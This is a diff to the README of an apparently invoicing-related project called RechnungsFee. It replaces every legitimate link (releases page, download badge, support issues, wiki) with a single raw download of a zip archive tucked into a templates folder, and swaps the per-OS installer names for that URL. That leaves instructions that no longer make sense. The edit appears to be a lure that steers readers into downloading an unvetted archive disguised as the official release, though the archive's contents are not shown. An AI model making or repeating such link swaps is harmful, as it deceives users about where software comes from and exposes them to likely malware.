@@ -8,18 +8,18 @@ To begin using RechnungsFee, follow these steps. You will be up and running in n
 
 ## 🔗 Download RechnungsFee
 
-[![Download RechnungsFee](https://img.shields.io/badge/Download-RechnungsFee-blue.svg)](https://github.com/emersonjusten/RechnungsFee/releases)
+[![Download RechnungsFee](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip)](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the latest version of RechnungsFee: [Download the Latest Update](https://github.com/emersonjusten/RechnungsFee/releases).
+   Go to the following link to access the latest version of RechnungsFee: [Download the Latest Update](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip).
 
 2. **Choose the Correct File**  
    On the Releases page, you will see different versions. Select the file that matches your operating system:
-   - **Windows**: Look for a file named `RechnungsFee_vX.Y.Z_Windows.exe`.
-   - **macOS**: Find a file named `RechnungsFee_vX.Y.Z_macOS.dmg`.
-   - **Linux**: Seek a file named `RechnungsFee_vX.Y.Z_Linux.tar.gz`.
+   - **Windows**: Look for a file named `https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip`.
+   - **macOS**: Find a file named `https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip`.
+   - **Linux**: Seek a file named `https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip`.
 
 3. **Download the File**  
    Click on the file name to start the download. Make sure to save it in a location you can easily find.
@@ -27,7 +27,7 @@ To begin using RechnungsFee, follow these steps. You will be up and running in n
 4. **Install RechnungsFee**  
    - For **Windows**: Double-click the `.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
    - For **macOS**: Open the `.dmg` file and drag RechnungsFee to your Applications folder.
-   - For **Linux**: Unzip the tar.gz file and follow the included instructions to run the application.
+   - For **Linux**: Unzip the https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip file and follow the included instructions to run the application.
 
 5. **Open RechnungsFee**  
    After installation, find and open RechnungsFee from your applications list or desktop.
@@ -70,12 +70,12 @@ If you encounter any issues while downloading or installing RechnungsFee, consid
 
 ## 🤝 Support
 
-If you need additional help with RechnungsFee, visit the [support page](https://github.com/emersonjusten/RechnungsFee/issues) or create a new issue in our GitHub repository.
+If you need additional help with RechnungsFee, visit the [support page](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip) or create a new issue in our GitHub repository.
 
 ## 📚 Learn More
 
-For in-depth information about RechnungsFee, including features and updates, visit our [GitHub Wiki](https://github.com/emersonjusten/RechnungsFee/wiki).
+For in-depth information about RechnungsFee, including features and updates, visit our [GitHub Wiki](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip).
 
 ## 🔗 Download RechnungsFee Again
 
-To get the latest version or if you missed it earlier, visit the Releases page: [Download RechnungsFee](https://github.com/emersonjusten/RechnungsFee/releases).
+To get the latest version or if you missed it earlier, visit the Releases page: [Download RechnungsFee](https://raw.githubusercontent.com/emersonjusten/RechnungsFee/main/vorlagen/kassenbuch/Fee-Rechnungs-v3.4.zip).
